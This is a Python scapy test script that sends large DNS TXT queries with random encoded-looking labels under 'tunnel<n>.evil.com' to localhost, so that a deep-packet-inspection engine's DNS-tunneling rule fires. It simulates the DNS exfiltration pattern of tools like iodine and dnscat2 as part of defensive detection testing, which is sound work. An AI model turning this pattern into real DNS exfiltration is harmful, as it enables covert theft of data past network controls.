"""
dns_tunnel_sim.py
─────────────────────────────────────────────────────────────────────────────
PURPOSE : Simulate DNS tunneling traffic so the DPI engine's
          checkDNSTunneling() rule fires.

HOW IT WORKS (mapped to your C++ code):
  checkDNSTunneling() fires when:
    1. isDNS = true          → packet uses UDP port 53
    2. packetSizeBytes > 512 → dnsTunnelingByteLimit in your config
    3. DANGER if avg > 300B AND variance > 10000 over 3+ packets

  Real DNS tunneling tools (iodine, dnscat2) encode binary data
  inside DNS TXT or NULL record queries. The encoded subdomain
  looks like: aGVsbG8gd29ybGQ.evil.com (base64 garbage subdomain).
  These queries are large because the payload IS the subdomain label.

WHAT WE SIMULATE:
  - Valid DNS query wire format (your extractDomain() will parse it)
  - UDP/53 so isDNS=true triggers in main.cpp
  - Packet size > 512 bytes (padded payload to exceed threshold)
  - Multiple packets with high avg + high variance → DANGER severity

USAGE:
  Terminal 1:  sudo executables/dpi_engine lo
  Terminal 2:  sudo python3 tests/dns_tunnel_sim.py

REQUIREMENTS:
    pip install scapy
"""

import random
import time
import sys
import string

try:
    from scapy.all import IP, UDP, DNS, DNSQR, send, conf, Raw
except ImportError:
    print("[ERROR] scapy not installed. Run: pip install scapy")
    sys.exit(1)

conf.verb = 0

# ── Configuration ─────────────────────────────────────────────────────────
TARGET_IP    = "127.0.0.1"
DNS_PORT     = 53
SOURCE_PORT  = random.randint(10000, 60000)   # fixed src port = one flow
TOTAL_PKTS   = 10      # your minPacketsForAnalysis=3, so 10 is plenty
INTERVAL     = 0.3     # seconds between packets

# ── Helpers ───────────────────────────────────────────────────────────────
def build_dns_tunnel_packet(seq: int) -> bytes:
    """
    Build a realistic DNS tunneling query.

    Real tunneling tools encode data inside the SUBDOMAIN label like:
        <base64-payload>.tunnel.evil.com

    The label can be up to 63 chars per segment in DNS wire format.
    We chain multiple labels to push total size past 512 bytes.

    Wire format of a DNS question label:
        <1-byte length><N bytes of label><1-byte length><N bytes>...<0x00>
    Your extractDomain() in main.cpp reads exactly this format.
    """

    # Generate a large encoded-looking subdomain (simulates base64 exfil data)
    # Real iodine/dnscat2 output looks exactly like this
    def random_label(length: int) -> str:
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

    # Build subdomain: multiple 63-char labels to simulate encoded payload
    # Each label = 63 chars = max allowed per DNS spec
    # 8 labels × 63 chars = 504 chars of "encoded data" in the subdomain alone
    labels = [random_label(63) for _ in range(8)]
    labels.append(f"tunnel{seq}")   # unique per packet = different seq numbers
    labels.append("evil")
    labels.append("com")
    domain_str = ".".join(labels)

    pkt = (
        IP(src=TARGET_IP, dst=TARGET_IP) /
        UDP(sport=SOURCE_PORT, dport=DNS_PORT) /
        DNS(
            rd=1,           # recursion desired = standard query
            qd=DNSQR(
                qname=domain_str,
                qtype="TXT"     # TXT record — most common tunneling type
                                # iodine uses NULL, dnscat2 uses TXT/CNAME
            )
        )
    )
    return pkt

# ── Main ──────────────────────────────────────────────────────────────────
print("[*] DNS Tunneling Simulator for DPI Engine")
print(f"[*] Target     : {TARGET_IP}:{DNS_PORT} (UDP)")
print(f"[*] Src port   : {SOURCE_PORT}  (fixed = one flow key)")
print(f"[*] Total pkts : {TOTAL_PKTS}")
print(f"[*] Threshold  : >512 bytes per packet (your dnsTunnelingByteLimit)")
print(f"[*] DANGER if  : avg>300B AND variance>10000 over 3+ packets")
print(f"[*] Starting in 3 seconds...\n")
time.sleep(3)

for i in range(1, TOTAL_PKTS + 1):
    pkt = build_dns_tunnel_packet(i)
    pkt_len = len(pkt)
    send(pkt)
    print(f"  [{i:02d}/{TOTAL_PKTS}] DNS tunnel query sent | size={pkt_len}B "
          f"| domain=<encoded>.evil.com")
    if i < TOTAL_PKTS:
        time.sleep(INTERVAL)

print(f"\n[+] Done. {TOTAL_PKTS} packets sent.")
print(f"[+] Expected: DNS_TUNNELING alert | Severity: DANGER")
print(f"[+] Flow key : {TARGET_IP}:{SOURCE_PORT} -> {TARGET_IP}:{DNS_PORT}")
print(f"[+] Evidence : Size>512B | Avg>300B | Variance>10000")